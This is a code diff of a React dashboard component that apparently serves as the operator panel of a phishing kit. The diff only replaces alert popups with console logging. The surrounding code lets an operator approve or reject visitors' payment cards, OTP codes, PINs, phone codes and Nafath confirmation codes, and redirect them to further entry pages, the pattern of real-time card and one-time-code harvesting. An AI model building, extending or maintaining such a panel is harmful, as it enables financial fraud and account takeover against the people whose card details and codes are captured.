@@ -97,11 +97,10 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       if (Object.keys(updates).length > 0) {
         console.log('[Dashboard] Sending redirect:', destination, updates)
         await updateApplication(visitor.id, updates)
-        alert(`تم توجيه الزائر بنجاح!`)
       }
     } catch (error) {
       console.error("Navigation error:", error)
-      alert(`حدث خطأ في التوجيه: ${error}`)
+      console.error(`حدث خطأ في التوجيه:`, error)
     } finally {
       setIsNavigating(false)
     }
@@ -113,10 +112,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     
     try {
       await updateApplication(visitor.id, { nafadConfirmationCode: nafadCode })
-      alert(`تم إرسال رقم التأكيد: ${nafadCode}`)
       setNafadCode("")
     } catch (error) {
-      alert("حدث خطأ في إرسال رقم التأكيد")
+      console.error("حدث خطأ في إرسال رقم التأكيد")
     }
   }
 
@@ -441,16 +439,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           if (action === "otp") {
             // Approve card with OTP - redirect to /veri
             await updateApplication(visitor.id, { cardStatus: "approved_with_otp" })
-            alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة OTP")
           } else if (action === "pin") {
             // Approve card with PIN - redirect to /confi
             await updateApplication(visitor.id, { cardStatus: "approved_with_pin" })
-            alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة PIN")
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
               // Reject card - save to oldCards and reset
               await updateApplication(visitor.id, { cardStatus: "rejected" })
-              alert("تم رفض البطاقة! سيتم توجيه الزائر لإدخال بطاقة جديدة")
             }
           }
           break
@@ -459,12 +454,10 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           if (action === "approve") {
             // Approve OTP using proper handler
             await handleOtpApproval(visitor.id, bubble.id, visitor.history || [])
-            alert("تم قبول كود OTP! سيتم توجيه الزائر لصفحة PIN")
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
               await handleOtpRejection(visitor.id, bubble.id, visitor.history || [])
-              alert("تم رفض كود OTP! سيتم توجيه الزائر لإدخال كود جديد")
             }
           }
           break
@@ -476,7 +469,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             } else {
               await updateApplication(visitor.id, { phoneOtpStatus: "approved" })
             }
-            alert("تم قبول كود الهاتف! سيتم توجيه الزائر لصفحة نفاذ")
+            // Phone OTP approved
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
               if (hasMultipleAttempts) {
@@ -486,20 +479,20 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                   phoneOtpStatus: "rejected"
                 })
               }
-              alert("تم رفض كود الهاتف! سيتم توجيه الزائر لإدخال كود جديد")
+              // Phone OTP rejected
             }
           } else if (action === "resend") {
             await updateApplication(visitor.id, {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp"
             })
-            alert("تم إعادة فتح مودال إدخال كود الهاتف")
+            // Phone OTP modal reopened
           }
           break
       }
     } catch (error) {
       console.error("Action error:", error)
-      alert(`حدث خطأ: ${error}`)
+      console.error(`حدث خطأ:`, error)
     } finally {
       setIsProcessing(false)
     }
